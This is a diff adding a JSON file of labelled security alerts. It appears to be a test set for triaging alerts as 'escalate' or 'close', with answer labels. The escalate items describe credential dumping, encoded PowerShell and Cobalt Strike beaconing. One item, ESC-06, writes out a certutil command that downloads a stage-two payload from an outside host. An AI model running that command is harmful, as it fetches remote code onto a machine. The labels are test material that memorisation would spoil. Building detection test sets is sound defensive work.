@@ -1,0 +1,98 @@
+[
+  {
+    "alert_id": "ESC-01",
+    "hostname": "dc-01.corp",
+    "ip_address": "198.51.100.23",
+    "text": "Detected mimikatz memory dump attempt against lsass.exe",
+    "ground_truth": "escalate",
+    "source": "MITRE ATT&CK T1003.001 - OS Credential Dumping"
+  },
+  {
+    "alert_id": "ESC-02",
+    "hostname": "db-prod.corp",
+    "ip_address": "10.0.4.15",
+    "text": "Execution of powershell -enc with outbound connection",
+    "ground_truth": "escalate",
+    "source": "MITRE ATT&CK T1059.001 - PowerShell"
+  },
+  {
+    "alert_id": "ESC-03",
+    "hostname": "payment-gateway.corp",
+    "ip_address": "203.0.113.88",
+    "text": "Potential ransomware file extension renaming loop detected",
+    "ground_truth": "escalate",
+    "source": "CISA Alert AA23-075A"
+  },
+  {
+    "alert_id": "ESC-04",
+    "hostname": "ws-analyst-04.corp",
+    "ip_address": "10.0.2.19",
+    "text": "Repeated unauthorized admin group modifications on domain controller",
+    "ground_truth": "escalate",
+    "source": "Windows Security Event ID 4728"
+  },
+  {
+    "alert_id": "ESC-05",
+    "hostname": "db-prod.corp",
+    "ip_address": "203.0.113.88",
+    "text": "Outbound periodic beacon pattern matching Cobalt Strike profile",
+    "ground_truth": "escalate",
+    "source": "Snort Rule 2024120"
+  },
+  {
+    "alert_id": "ESC-06",
+    "hostname": "dc-01.corp",
+    "ip_address": "198.51.100.23",
+    "text": "certutil.exe -urlcache -split -f http://transfer.io/stage2.bin",
+    "ground_truth": "escalate",
+    "source": "MITRE ATT&CK T1105 - Ingress Tool Transfer (LOLBAS)"
+  },
+  {
+    "alert_id": "CLS-01",
+    "hostname": "ws-print01.corp",
+    "ip_address": "10.0.9.11",
+    "text": "Scheduled spooler cleanup job completed successfully",
+    "ground_truth": "close",
+    "source": "Standard Windows Print Service logs"
+  },
+  {
+    "alert_id": "CLS-02",
+    "hostname": "ws-dev-12.corp",
+    "ip_address": "10.0.5.21",
+    "text": "Docker container build executed standard pip install commands",
+    "ground_truth": "close",
+    "source": "Dev workstation local audit log"
+  },
+  {
+    "alert_id": "CLS-03",
+    "hostname": "web-proxy.corp",
+    "ip_address": "10.0.1.1",
+    "text": "TLS certificate re-negotiation successful for internal endpoint",
+    "ground_truth": "close",
+    "source": "HAProxy access log"
+  },
+  {
+    "alert_id": "CLS-04",
+    "hostname": "fileshare-02.corp",
+    "ip_address": "10.0.8.4",
+    "text": "Routine nightly backup archived 42GB of user home folders",
+    "ground_truth": "close",
+    "source": "Veeam backup agent logs"
+  },
+  {
+    "alert_id": "CLS-05",
+    "hostname": "ws-reception.corp",
+    "ip_address": "10.0.10.5",
+    "text": "Standard Windows Update KB5034441 installed and host rebooted",
+    "ground_truth": "close",
+    "source": "Windows Update Agent Event 19"
+  },
+  {
+    "alert_id": "CLS-06",
+    "hostname": "ws-sec-scanner.corp",
+    "ip_address": "10.0.0.99",
+    "text": "Nessus audit check completed: policy verifying unauthorized admin access rules",
+    "ground_truth": "close",
+    "source": "Tenable Nessus Compliance Plugin 21156"
+  }
+]
